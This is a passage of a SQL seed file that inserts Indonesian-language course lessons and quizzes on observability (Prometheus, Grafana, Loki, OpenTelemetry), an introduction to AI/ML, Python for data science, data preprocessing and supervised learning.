      description: "Current error rate: {{ $value | humanizePercentage }}"

  - alert: HighLatencyP99
    expr: |
      histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m])) > 0.5
    for: 5m
    labels: {severity: warning}
    annotations:
      summary: "P99 latency > 500ms"
```

### Alertmanager

```yaml
# alertmanager.yml
route:
  receiver: ''slack-default''
  group_by: [''alertname'', ''service'']
  group_wait: 30s
  group_interval: 5m
  repeat_interval: 4h
receivers:
- name: ''slack-default''
  slack_configs:
  - api_url: ''https://hooks.slack.com/services/...''
    channel: ''#alerts''
- name: ''pd-critical''
  webhook_configs:
  - url: ''https://events.pagerduty.com/...''
```

## Grafana Dashboard

Grafana membuat dashboard dari berbagai source (Prometheus, Loki, ES). Praktik baik:

- Panel per service: RED (Rate, Error, Duration) untuk service; USE (Utilization, Saturation, Errors) untuk resource.
- Threshold berwarna (green/yellow/red).
- Variable untuk filter multi-environment.
- Alerting via Grafana (bisa kirim ke Slack/PD).

```text
Dashboard kunci untuk web service:
1. Service overview: req/s, error rate, p50/p95/p99 latency
2. Resource: CPU, memory, disk, network
3. Business: signup, conversion, revenue
4. SLO: error budget burn rate
5. Cache: hit/miss ratio, eviction
```

## Logging dengan ELK / Loki

### ELK Stack
- **Elasticsearch** — search & analytics engine.
- **Logstash** — pipeline parsing/enrichment.
- **Kibana** — visualisasi & dashboard.
- **Beats** (Filebeat, Metricbeat) — agent pengirim data.

### Loki + Promtail (alternatif ringan)
Loki menyimpan log dengan index by label saja (bukan full-text), jauh lebih murah dari ES.

```yaml
# promtail-config.yml
server:
  http_listen_port: 9080
positions:
  filename: /tmp/positions.yaml
clients:
  - url: http://loki:3100/loki/api/v1/push
scrape_configs:
  - job_name: app_logs
    static_configs:
      - targets: [localhost]
        labels:
          job: api
          env: prod
          __path__: /var/log/api/*.log
    pipeline_stages:
      - regex:
          expression: ''(?P<ts>\S+) (?P<level>\w+) (?P<msg>.*)$''
      - labels:
          level:
```

### Structured Logging

Log dalam format JSON agar mudah diparse:

```python
import structlog, logging
logging.basicConfig(level=logging.INFO)
structlog.configure(processors=[
    structlog.processors.TimeStamper(fmt="iso"),
    structlog.processors.add_log_level,
    structlog.processors.JSONRenderer(),
])
log = structlog.get_logger()

log.info("user_login", user_id=42, ip="10.0.0.1", method="oidc")
# Output: {"event":"user_login","user_id":42,"ip":"10.0.0.1","method":"oidc","level":"info","timestamp":"2024-..."}
```

```bash
# Query log di Loki (LogQL)
{job="api",env="prod"} |= "error" | json | level="ERROR" | line_format "{{.msg}}"

# Query di Elasticsearch
GET /api-logs-*/_search
{
  "query": {
    "bool": {
      "must": [
        {"match": {"level": "ERROR"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  }
}
```

## Distributed Tracing

Trace menelusuri request lintas service. Standar: **OpenTelemetry**.

```python
from opentelemetry import trace
from opentelemetry.exporter.jaeger.thrift import JaegerExporter
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor

trace.set_tracer_provider(TracerProvider())
trace.get_tracer_provider().add_span_processor(
    BatchSpanProcessor(JaegerExporter(agent_host_name="jaeger", agent_port=6831))
)
tracer = trace.get_tracer(__name__)

with tracer.start_as_current_span("process_order") as span:
    span.set_attribute("order.id", 12345)
    # ... business logic ...
    with tracer.start_as_current_span("charge_payment"):
        # call payment service
        pass
```

## SLO & Error Budget

SLO (Service Level Objective) adalah target reliability, mis. "99.9% request sukses dalam 28 hari". Error budget = 100% - SLO. Untuk 99.9% dalam 28 hari, budget = 0.1% * 40320 min = ~40 menit downtime.

```text
SLO implementation:
- SLI: ratio good events / total events
- Burn rate alert: jika burn rate > 14.4x dalam 1 jam → page
- Multi-window multi-burn-rate: 1h+5m, 6h+30m
- Tracking via Prometheus + Sloth
```

## Tips & Best Practices

- Tetapkan **cardinality budget** untuk label Prometheus (hindari user_id, request_id sebagai label—ledakan series).
- Sampling traces untuk cost (head sampling atau tail sampling via OTel Collector).
- Retention: metric 15 hari (hemat storage), log 30-90 hari, trace 7-14 hari.
- Centralized logging + immutable (append-only) untuk audit.
- Sentralisasi dashboard link di runbook agar on-call cepat.
- Latih **game days** untuk on-call.

## Kesimpulan

Observability adalah pembeda antara operasional yang reaktif vs proaktif. Dengan stack Prometheus+Grafana+Loki+Jaeger yang terintegrasi, tim dapat mendeteksi masalah sebelum pengguna merasakan, mendiagnosa cepat saat insiden, dan belajar dari post-mortem. SLO memberi kerangka berpikir tentang reliability sebagai produk. Observability bukan biaya—ia investasi ketenangan operasional.



## Studi Kasus: Deploy ke Production

Docker, Kubernetes, CI/CD.

## Tips

> Kuasai Linux sebelum Docker/K8s.', '📊', false, '[{"question":"Tipe metrik Prometheus untuk nilai yang bisa naik-turun (mis. memory)?","options":["Counter","Gauge","Histogram","Summary"],"answer":1,"explanation":"Gauge untuk nilai yang bisa naik-turun (memory, queue size, temperature)."},{"question":"Komponen ELK untuk visualisasi dashboard?","options":["Elasticsearch","Logstash","Kibana","Beats"],"answer":2,"explanation":"Kibana adalah UI visualisasi dan dashboard untuk data di Elasticsearch."},{"question":"Standar terbuka untuk distributed tracing?","options":["OpenSSL","OpenTelemetry","OpenStack","OpenShift"],"answer":1,"explanation":"OpenTelemetry adalah standar CNCF untuk traces, metrics, dan logs."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('pengenalan-ai-ml', 8, 1, 'Pengenalan AI & ML', 'pengenalan-ai-ml', 'AI, ML, deep learning, dan landscape machine learning modern.', '# Pengenalan AI & ML


![Pengenalan AI & ML](https://sfile.chatglm.cn/images-ppt/a74823b737fd.jpg)

**Artificial Intelligence (AI)** adalah bidang ilmu komputer yang berusaha membuat mesin meniru kecerdasan manusia—berpikir, belajar, dan mengambil keputusan. Di dalamnya, **Machine Learning (ML)** adalah cabang di mana mesin belajar pola dari data tanpa diprogram eksplisit. **Deep Learning** adalah sub-bidang ML berbasis neural network berlapis dalam. Memahami perbedaan dan keterkaitan ketiganya adalah pintu masuk ke dunia data science modern.

![Pengenalan AI & ML](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Spektrum AI

```text
┌─────────────────────────────────────────────┐
│  Artificial Intelligence (AI)               │
│  ┌───────────────────────────────────────┐  │
│  │  Machine Learning (ML)                │  │
│  │  ┌─────────────────────────────────┐  │  │
│  │  │  Deep Learning (DL)             │  │  │
│  │  │  (Neural Network banyak lapis)  │  │  │
│  │  └─────────────────────────────────┘  │  │
│  └───────────────────────────────────────┘  │
└─────────────────────────────────────────────┘

AI: semua teknik membuat mesin "cerdas" (termasuk rule-based, expert system)
ML: subset AI yang belajar dari data
DL: subset ML dengan neural network dalam
```

## Kategori Machine Learning

### 1. Supervised Learning
Data berlabel (input → output). Model belajar mapping. Contoh: klasifikasi email spam/ham, regresi harga rumah, deteksi tumor.

### 2. Unsupervised Learning
Data tanpa label. Model menemukan struktur. Contoh: clustering pelanggan, dimensi reduksi (PCA), anomaly detection.

### 3. Reinforcement Learning
Agent belajar melalui interaksi dengan environment, mendapat reward/punishment. Contoh: AlphaGo, robot navigation, game AI.

### 4. Semi-supervised & Self-supervised
Sedikit data berlabel + banyak tanpa label (semi). Self-supervised: label dibuat dari data sendiri (pre-training LLM memprediksi token berikutnya).

## Workflow ML End-to-End

1. **Problem definition** — bisnis vs ML problem, metric sukses.
2. **Data collection** — sourcing, labeling, versioning.
3. **EDA** — eksplorasi, statistik, visualisasi.
4. **Preprocessing** — cleaning, encoding, scaling, split.
5. **Feature engineering** — transformasi, selection.
6. **Model selection & training** — baseline → kompleks.
7. **Evaluation** — cross-validation, metric sesuai konteks.
8. **Hyperparameter tuning** — GridSearch, Bayesian, Optuna.
9. **Deployment** — serving, monitoring, drift detection.
10. **Iterate** — model improvement, retraining.

## Tipe Tugas ML

| Tipe | Output | Contoh |
|------|--------|--------|
| **Klasifikasi** | Kategori diskrit | Spam detection, image class |
| **Regresi** | Nilai kontinu | Harga, suhu, demand |
| **Clustering** | Group tanpa label | Customer segmentation |
| **Ranking** | Urutan | Search results, recommendations |
| **Generative** | Data baru | Image generation, text synthesis |
| **Reinforcement** | Aksi/kebijakan | Game playing, robotics |

## Contoh Klasifikasi Sederhana

```python
# Klasifikasi iris dataset dengan scikit-learn
from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import classification_report, accuracy_score

X, y = load_iris(return_X_y=True)
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y
)

clf = RandomForestClassifier(n_estimators=100, random_state=42)
clf.fit(X_train, y_train)
y_pred = clf.predict(X_test)

print(f"Accuracy: {accuracy_score(y_test, y_pred):.4f}")
print(classification_report(y_test, y_pred, target_names=load_iris().target_names))
```

## Konsep Penting

- **Feature** — variabel input (kolom dalam dataset).
- **Label/Target** — output yang diprediksi.
- **Training set** — data untuk melatih model.
- **Validation set** — untuk hyperparameter tuning.
- **Test set** — evaluasi akhir, hanya sekali.
- **Overfitting** — model hafal training, buruk di test.
- **Underfitting** — model terlalu sederhana, buruk di keduanya.
- **Bias-Variance tradeoff** — keseimbangan generalisasi.

## Bias-Variance Tradeoff

```text
Error total = Bias² + Variance + Irreducible Error

Bias tinggi   → underfitting (model terlalu sederhana)
Variance tinggi → overfitting (model terlalu kompleks, sensitif terhadap training)

Strategi:
- Bias tinggi: model lebih kompleks, lebih feature
- Variance tinggi: lebih banyak data, regularisasi, ensemble
```

## Landscape Tools ML

| Kategori | Tools |
|----------|-------|
| Klasik ML | scikit-learn, XGBoost, LightGBM |
| Deep Learning | PyTorch, TensorFlow, JAX |
| Serving | FastAPI, TorchServe, TF Serving, Triton |
| MLOps | MLflow, Weights & Biases, Kubeflow |
| Data | pandas, polars, Dask, Spark |
| Visualisasi | matplotlib, seaborn, plotly |

## Etika & Tanggung Jawab AI

- **Bias & fairness** — data bias menghasilkan model bias.
- **Privacy** — differential privacy, federated learning.
- **Explainability** — SHAP, LIME untuk interpretasi.
- **Transparency** — dokumentasi model card.
- **Misuse** — deepfake, surveillance, disinformation.
- **Regulasi** — EU AI Act (2024), UU AI di berbagai negara.

## Tips & Best Practices

- Mulai dari **baseline sederhana** (heuristik/regresi linear) sebelum model kompleks.
- **Data > Model** — kualitas data lebih penting dari algoritma canggih.
- Setup **reproducibility** (seed, versioning data+code, MLflow).
- **Cross-validation** untuk evaluasi yang robust.
- Monitor **data drift** dan **concept drift** di produksi.
- Lakukan **A/B testing** sebelum model go-live ke seluruh pengguna.

## Kesimpulan

AI/ML adalah bidang luas yang mentransformasi industri. Memahami spektrum AI→ML→DL, kategori pembelajaran (supervised/unsupervised/RL), dan workflow end-to-end memberi Anda fondasi yang kuat. Yang paling penting: ML bukan sihir—ia disiplin yang membutuhkan data berkualitas, eksperimen terkontrol, dan pertimbangan etis. Pada level berikutnya kita akan mendalami Python sebagai bahasa utama data science.



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '🤖', false, '[{"question":"Cabang AI di mana mesin belajar dari data tanpa diprogram eksplisit?","options":["Expert System","Machine Learning","Robotic Process Automation","Symbolic AI"],"answer":1,"explanation":"Machine Learning belajar pola dari data, tidak perlu aturan eksplisit."},{"question":"Jenis ML yang menggunakan data berlabel (input-output)?","options":["Supervised Learning","Unsupervised Learning","Reinforcement Learning","Self-supervised Learning"],"answer":0,"explanation":"Supervised Learning menggunakan pasangan input-output berlabel untuk training."},{"question":"Kondisi saat model hafal training data namun buruk di test?","options":["Underfitting","Overfitting","Convergence","Regularization"],"answer":1,"explanation":"Overfitting: model terlalu fit ke training, gagal generalisasi ke data baru."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('python-data-science', 8, 2, 'Python untuk Data Science', 'python-data-science', 'NumPy, pandas, matplotlib untuk analisis data di Python.', '# Python untuk Data Science


![Python untuk Data Science](https://sfile.chatglm.cn/images-ppt/a74823b737fd.jpg)

Python adalah bahasa de facto data science berkat ekosistem library kaya: NumPy untuk komputasi numerik, pandas untuk manipulasi tabular, matplotlib/seaborn untuk visualisasi, dan scikit-learn untuk ML. Materi ini mengupas dasar-dasar library inti yang akan dipakai di seluruh perjalanan ML.

![Python untuk Data Science](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Setup Environment

```bash
# Buat virtual environment
python -m venv .venv
source .venv/bin/activate    # Linux/macOS
.venv\Scripts\activate       # Windows

# Install library inti
pip install numpy pandas matplotlib seaborn scikit-learn jupyter

# Atau pakai conda
conda create -n ds python=3.11
conda activate ds
conda install numpy pandas matplotlib seaborn scikit-learn

# Jalankan notebook
jupyter lab
```

## NumPy: Array Numerik

NumPy menyediakan array n-dimensi yang efisien—basis semua library data science Python.

```python
import numpy as np

# Buat array
a = np.array([1, 2, 3, 4, 5])
b = np.arange(0, 10, 2)              # [0 2 4 6 8]
c = np.linspace(0, 1, 5)             # [0. 0.25 0.5 0.75 1.]
d = np.zeros((3, 4))                 # 3x4 nol
e = np.random.randn(100, 5)          # 100x5 normal

# Operasi vektor (cepat, no loop)
a * 2                                # elementwise
a.sum(), a.mean(), a.std()
e.T                                  # transpose
e @ e.T                              # matrix multiplication
np.where(a > 2, "besar", "kecil")    # conditional

# Broadcasting
x = np.arange(3)                     # [0 1 2]
y = np.arange(3).reshape(3, 1)       # [[0],[1],[2]]
x + y                                # 3x3 hasil broadcast
```

## pandas: Manipulasi Data Tabular

pandas adalah Excel-nya Python—DataFrame untuk analisis.

```python
import pandas as pd

# Load CSV
df = pd.read_csv("data/sales.csv", parse_dates=["date"])
df.head()
df.info()
df.describe()

# Seleksi
df[(df["region"] == "APAC") & (df["amount"] > 1000)]
df.loc[df["status"] == "paid", ["customer", "amount"]]

# Group & aggregate
df.groupby("region")["amount"].agg(["sum", "mean", "count"])
df.groupby(["region", "product"])["amount"].sum().unstack()

# Pivot table
pd.pivot_table(df, values="amount", index="region",
               columns="product", aggfunc="sum", margins=True)

# Join/merge
merged = orders.merge(customers, on="customer_id", how="left")

# Time series
df.set_index("date").resample("M")["amount"].sum().plot()

# Handle missing
df.isna().sum()
df.fillna({"amount": 0, "region": "Unknown"})
df.dropna(subset=["customer_id"])

# Apply function
df["category"] = df["amount"].apply(
    lambda x: "large" if x > 1000 else "small"
)

# Dummy variable (one-hot)
pd.get_dummies(df, columns=["region"], drop_first=True)
```

## Visualisasi: matplotlib & seaborn

```python
import matplotlib.pyplot as plt
import seaborn as sns

# Set style
sns.set_theme(style="whitegrid")

# Line plot
fig, ax = plt.subplots(figsize=(10, 5))
df.set_index("date")["amount"].plot(ax=ax)
ax.set_title("Sales Over Time")
ax.set_xlabel("Date"); ax.set_ylabel("Amount")
plt.tight_layout(); plt.savefig("sales.png", dpi=150)

# Histogram + KDE
fig, axes = plt.subplots(1, 2, figsize=(12, 4))
sns.histplot(df["amount"], kde=True, ax=axes[0])
sns.boxplot(data=df, x="region", y="amount", ax=axes[1])

# Correlation heatmap
fig, ax = plt.subplots(figsize=(8, 6))
sns.heatmap(df.select_dtypes("number").corr(),
            annot=True, cmap="coolwarm", center=0, ax=ax)

# Pairplot
sns.pairplot(df[["amount", "quantity", "discount", "region"]], hue="region")
```

## EDA (Exploratory Data Analysis) Workflow

```python
# Template EDA cepat
def quick_eda(df):
    print("Shape:", df.shape)
    print("\nDtypes:")
    print(df.dtypes.value_counts())
    print("\nMissing (%):")
    print((df.isna().mean() * 100).round(2).sort_values(ascending=False).head(10))
    print("\nNumeric describe:")
    print(df.describe().T[["mean", "std", "min", "50%", "max"]])
    print("\nCategorical:")
    for col in df.select_dtypes("object").columns:
        print(f"  {col}: {df[col].nunique()} unique, top = {df[col].value_counts().head(3).to_dict()}")

quick_eda(df)
```

## scikit-learn: ML Toolkit

```python
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import classification_report, confusion_matrix

# Split
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, stratify=y, random_state=42
)

# Pipeline (mencegah data leakage)
from sklearn.pipeline import Pipeline
pipe = Pipeline([
    ("scaler", StandardScaler()),
    ("clf", LogisticRegression(max_iter=1000))
])
pipe.fit(X_train, y_train)
print(classification_report(y_test, pipe.predict(X_test)))

# Cross-validation
scores = cross_val_score(pipe, X, y, cv=5, scoring="f1_macro")
print(f"CV F1: {scores.mean():.3f} ± {scores.std():.3f}")
```

## Best Practices Kode

- Gunakan **virtual environment** per project.
- **Reproducibility**: set random seed, pin versi di requirements.txt.
- **Notebook hygiene**: jalankan dari atas ke bawah tanpa error.
- **Type hint** untuk fungsi penting.
- **Logging** alih-alih print untuk pipeline produksi.
- **Modularisasi**: pindahkan fungsi ke .py, impor di notebook.

```python
# Reproducibility
import numpy as np, tensorflow as tf, random, os
SEED = 42
os.environ["PYTHONHASHSEED"] = str(SEED)
random.seed(SEED); np.random.seed(SEED); tf.random.set_seed(SEED)
```

## Tips & Best Practices

- Pelajari **vectorized operation**—hindari loop di Python murni.
- Gunakan **dtype** tepat (category untuk string rendah kardinalitas, int8/int16 untuk hemat memori).
- Untuk dataset besar, pertimbangkan **polars** (lebih cepat dari pandas) atau **Dask/Spark**.
- Eksplorasi dengan **ydata-profiling** untuk laporan EDA otomatis.
- Simpan dataset besar dalam format **parquet/feather**, bukan CSV (lebih cepat & kecil).
- Gunakan **Jupyter Lab** dengan ekstensi untuk produktivitas.

## Kesimpulan

Python dengan NumPy, pandas, matplotlib, dan scikit-learn adalah toolkit wajib data scientist. Kuasai array NumPy, manipulasi DataFrame pandas, dan workflow EDA—sisanya adalah kombinasi. Yang membedakan data scientist biasa dari hebat adalah kemampuan **merangkai pertanyaan bisnis → data → analisis → rekomendasi**, bukan sekadar memanggil API library. Pada level berikutnya kita akan mendalami data preprocessing yang menentukan kualitas model.



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '🐍', false, '[{"question":"Library Python utama untuk komputasi array numerik?","options":["pandas","NumPy","matplotlib","scikit-learn"],"answer":1,"explanation":"NumPy menyediakan ndarray n-dimensi yang efisien sebagai basis library lain."},{"question":"Fungsi pandas untuk operasi group + aggregate?","options":["df.pivot()","df.group()","df.groupby()","df.merge()"],"answer":2,"explanation":"df.groupby(''col'')[''target''].agg(...) untuk agregasi per grup."},{"question":"Praktik terbaik agar pipeline sklearn tidak leak data?","options":["Fit scaler di seluruh data","Gunakan Pipeline dengan fit pada train only","Scaling manual sebelum split","Skip scaling"],"answer":1,"explanation":"Pipeline sklearn fit hanya pada training data, transform pada test—no leakage."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('data-preprocessing', 8, 3, 'Data Preprocessing', 'data-preprocessing', 'Cleaning, encoding, scaling, dan feature engineering untuk ML.', '# Data Preprocessing


![Data Preprocessing](https://sfile.chatglm.cn/images-ppt/effe006fe738.png)

**Data preprocessing** menghabiskan 60-80% waktu data scientist. Kualitas model sangat ditentukan oleh kualitas input—prinsip "garbage in, garbage out". Materi ini mengupas pembersihan data, handling missing value, encoding kategorikal, scaling, feature engineering, dan splitting strategis.

![Data Preprocessing](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Pipeline Preprocessing

```text
Raw Data
  → Data Cleaning (duplikat, typo, invalid)
  → Missing Value Handling
  → Encoding Categorical
  → Feature Engineering
  → Scaling / Normalization
  → Feature Selection
  → Train/Val/Test Split
```

## Data Cleaning

```python
import pandas as pd
import numpy as np

df = pd.read_csv("data/raw.csv")

# Hapus duplikat
df = df.drop_duplicates()
df = df.drop_duplicates(subset=["customer_id", "order_id"])

# Standarisasi format string
df["email"] = df["email"].str.lower().str.strip()
df["phone"] = df["phone"].str.replace(r"\D", "", regex=True)

# Perbaiki typo dengan mapping
gender_map = {"M": "male", "F": "female", "Male": "male", "Female": "female",
              "male": "male", "female": "female"}
df["gender"] = df["gender"].map(gender_map).fillna("unknown")

# Outlier detection dengan IQR
def remove_outliers_iqr(df, col, k=1.5):
    q1, q3 = df[col].quantile([0.25, 0.75])
    iqr = q3 - q1
    lower, upper = q1 - k * iqr, q3 + k * iqr
    return df[(df[col] >= lower) & (df[col] <= upper)]

df = remove_outliers_iqr(df, "annual_income")

# Konversi tipe
df["date"] = pd.to_datetime(df["date"], errors="coerce")
df["amount"] = pd.to_numeric(df["amount"], errors="coerce")
```

## Missing Value Handling

Strategi tergantung jenis dan persentase missing:

```python
# Analisis missing
missing = df.isna().mean().sort_values(ascending=False)
print(missing[missing > 0])

# 1. Drop kolom > 50% missing
thresh = len(df) * 0.5
df = df.dropna(thresh=thresh, axis=1)

# 2. Drop baris dengan target missing
df = df.dropna(subset=["target"])

# 3. Imputasi numerik
from sklearn.impute import SimpleImputer, KNNImputer
num_imputer = SimpleImputer(strategy="median")   # atau mean
df[["age", "income"]] = num_imputer.fit_transform(df[["age", "income"]])

# 4. Imputasi kategorikal
cat_imputer = SimpleImputer(strategy="most_frequent", fill_value="missing")
df[["city", "job"]] = cat_imputer.fit_transform(df[["city", "job"]])

# 5. KNN imputer (lebih canggih, prediksi dari tetangga)
knn_imp = KNNImputer(n_neighbors=5)
df[["age", "income", "score"]] = knn_imp.fit_transform(df[["age", "income", "score"]])

# 6. Flag missing sebagai feature
df["income_missing"] = df["income"].isna().astype(int)
```

## Encoding Categorical

### One-Hot Encoding (untuk kardinalitas rendah)
```python
df = pd.get_dummies(df, columns=["city"], prefix="city", drop_first=True)
```

### Label/Ordinal Encoding (untuk ordinal)
```python
from sklearn.preprocessing import OrdinalEncoder
oe = OrdinalEncoder(categories=[["low", "medium", "high"]])
df["satisfaction"] = oe.fit_transform(df[["satisfaction"]])
```

### Target Encoding (untuk kardinalitas tinggi)
```python
from category_encoders import TargetEncoder
te = TargetEncoder(smoothing=10)
df["city_encoded"] = te.fit_transform(df["city"], df["target"])
```

### Frequency Encoding
```python
freq = df["city"].value_counts(normalize=True)
df["city_freq"] = df["city"].map(freq)
```

## Feature Scaling

```python
from sklearn.preprocessing import StandardScaler, MinMaxScaler, RobustScaler

# StandardScaler (mean=0, std=1) - default untuk SVM, LR, NN
scaler = StandardScaler()
df[["age", "income"]] = scaler.fit_transform(df[["age", "income"]])

# MinMaxScaler (0-1) - untuk NN dengan sigmoid
mm = MinMaxScaler()
df[["score"]] = mm.fit_transform(df[["score"]])

# RobustScaler (median & IQR) - tahan outlier
rs = RobustScaler()
df[["income"]] = rs.fit_transform(df[["income"]])

# Penting: fit pada train only, transform test (via Pipeline)
from sklearn.pipeline import Pipeline
pipe = Pipeline([
    ("scaler", StandardScaler()),
    ("model", LogisticRegression())
])
```

## Feature Engineering

```python
# Date features
df["order_date"] = pd.to_datetime(df["order_date"])
df["order_month"] = df["order_date"].dt.month
df["order_dow"] = df["order_date"].dt.dayofweek
df["is_weekend"] = df["order_dow"].isin([5, 6]).astype(int)
df["days_since_first"] = (df["order_date"] - df.groupby("customer_id")["order_date"].transform("min")).dt.days

# Interaction features
df["income_per_age"] = df["income"] / df["age"]
df["family_size_x_income"] = df["family_size"] * df["income"]

# Binning
df["age_group"] = pd.cut(df["age"], bins=[0, 18, 30, 45, 60, 100],
                         labels=["<18", "18-30", "30-45", "45-60", "60+"])

# Log transform untuk skew
df["log_income"] = np.log1p(df["income"])

# Text → numeric
df["desc_length"] = df["description"].str.len()
df["desc_word_count"] = df["description"].str.split().str.len()
```

## Train/Val/Test Split

```python
from sklearn.model_selection import train_test_split, StratifiedKFold

# Stratified split (menjaga distribusi kelas)
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, stratify=y, random_state=42
)
X_train, X_val, y_train, y_val = train_test_split(
    X_train, y_train, test_size=0.25, stratify=y_train, random_state=42
)
# 60/20/20 split

# Time-based split (untuk time series, no leakage)
train = df[df["date"] < "2024-01-01"]
val   = df[(df["date"] >= "2024-01-01") & (df["date"] < "2024-04-01")]
test  = df[df["date"] >= "2024-04-01"]

# Group split (mencegah patient/user leak)
from sklearn.model_selection import GroupKFold
gkf = GroupKFold(n_splits=5)
for tr_idx, val_idx in gkf.split(X, y, groups=df["customer_id"]):
    X_tr, X_vl = X.iloc[tr_idx], X.iloc[val_idx]
```

## Imbalanced Data Handling

```python
from imblearn.over_sampling import SMOTE
from imblearn.under_sampling import RandomUnderSampler
from imblearn.combine import SMOTETomek
from sklearn.utils.class_weight import compute_class_weight

# Class weight (paling simpel, recommended untuk DL)
classes = np.unique(y_train)
weights = compute_class_weight("balanced", classes=classes, y=y_train)
class_weight = dict(zip(classes, weights))
clf = RandomForestClassifier(class_weight=class_weight)

# Oversampling minoritas
sm = SMOTE(random_state=42)
X_res, y_res = sm.fit_resample(X_train, y_train)

# Undersampling mayoritas
rus = RandomUnderSampler(random_state=42)
X_res, y_res = rus.fit_resample(X_train, y_train)
```

## Tips & Best Practices

- Selalu **fit transform pada train only**, lalu transform test/val via Pipeline untuk mencegah data leakage.
- Buat **data quality report** sebelum modeling.
- **Versioning dataset** dengan DVC atau Delta Lake.
- Dokumentasikan setiap transformasi di **feature store** (Feast, Hopsworks).
- Untuk produksi, gunakan **sklearn ColumnTransformer** untuk preprocessing multi-kolom.
- Evaluasi dampak setiap transformasi via cross-validation sebelum terima.

```python
from sklearn.compose import ColumnTransformer
preprocessor = ColumnTransformer([
    ("num", Pipeline([("imputer", SimpleImputer(strategy="median")),
                      ("scaler", StandardScaler())]), numeric_cols),
    ("cat", Pipeline([("imputer", SimpleImputer(strategy="most_frequent")),
                      ("onehot", OneHotEncoder(handle_unknown="ignore"))]), categorical_cols),
])
full_pipe = Pipeline([("pre", preprocessor), ("clf", RandomForestClassifier())])
```

## Kesimpulan

Data preprocessing adalah seni sekaligus sains. Pembersihan teliti, encoding tepat, scaling sesuai algoritma, dan split tanpa leakage—semua menentukan apakah model produksi akan berkinerja atau gagal. Investasikan waktu di sini; kesalahan kecil seperti fit pada seluruh data sebelum split dapat membatalkan semua kerja keras downstream. Preprocessing yang baik adalah pembeda model "berjalan di laptop" vs model "berjalan di produksi".



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '🧹', false, '[{"question":"Scaling yang paling tahan terhadap outlier?","options":["StandardScaler","MinMaxScaler","RobustScaler","No scaling"],"answer":2,"explanation":"RobustScaler pakai median & IQR, tahan terhadap outlier ekstrem."},{"question":"Encoding yang tepat untuk variabel kategorikal kardinalitas tinggi?","options":["One-Hot","Target Encoding","Ordinal","Label"],"answer":1,"explanation":"Target Encoding cocok untuk kardinalitas tinggi (mis. kode pos) tanpa ledakan dimensi."},{"question":"Cara mencegah data leakage saat preprocessing?","options":["Fit scaler pada seluruh data","Fit scaler pada train only, transform test","Skip scaling","Transform sebelum split"],"answer":1,"explanation":"Fit pada train only, transform pada test. Gunakan sklearn Pipeline."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('supervised-learning', 8, 4, 'Supervised Learning', 'supervised-learning', 'Regresi, klasifikasi, algoritma, dan evaluasi supervised learning.', '# Supervised Learning


![Supervised Learning](https://sfile.chatglm.cn/images-ppt/dd77ac8e6c34.jpeg)

**Supervised learning** adalah cabang ML di mana model belajar dari data berlabel (pasangan input-output) untuk memprediksi output pada input baru. Dibagi menjadi dua tugas utama: **regresi** (output kontinu) dan **klasifikasi** (output diskrit). Materi ini mengupas algoritma inti, cara kerjanya, dan evaluasi yang tepat.

![Supervised Learning](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Regresi vs Klasifikasi

| Aspek | Regresi | Klasifikasi |
|-------|---------|-------------|
| Output | Kontinu (real number) | Diskrit (kelas) |
| Contoh | Harga rumah, suhu, demand | Spam/ham, churn yes/no |
| Loss umum | MSE, MAE, Huber | Cross-entropy, hinge |
| Metric | RMSE, MAE, R² | Accuracy, F1, AUC |
| Algoritma | Linear, Ridge, Lasso, RF | LogReg, SVM, RF, XGBoost |

## Algoritma Klasik

### Linear & Logistic Regression
Sederhana, interpretable, baseline kuat.

```python
from sklearn.linear_model import LinearRegression, LogisticRegression, Ridge, Lasso

# Regresi linear
reg = LinearRegression()
reg.fit(X_train, y_train)
print(f"Coefficients: {dict(zip(X.columns, reg.coef_))}")
print(f"R² train: {reg.score(X_train, y_train):.3f}")

# Logistic regression (binary)
clf = LogisticRegression(penalty="l2", C=1.0, max_iter=1000)
clf.fit(X_train, y_train)
print(f"Predicted probabilities: {clf.predict_proba(X_test)[:5]}")

# Regularisasi: Ridge (L2), Lasso (L1)
ridge = Ridge(alpha=1.0)
lasso = Lasso(alpha=0.1)   # Lasso melakukan feature selection
```

### Decision Tree & Random Forest
Decision tree mempartisi feature space; random forest adalah ensemble pohon-pohon.

```python
from sklearn.tree import DecisionTreeClassifier, plot_tree
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier

# Single tree (interpretable, rentan overfit)
dt = DecisionTreeClassifier(max_depth=5, min_samples_leaf=20, random_state=42)
dt.fit(X_train, y_train)

# Random forest (robust, populer)
rf = RandomForestClassifier(n_estimators=200, max_depth=None,
                            min_samples_leaf=5, max_features="sqrt",
                            n_jobs=-1, random_state=42)
rf.fit(X_train, y_train)

# Feature importance
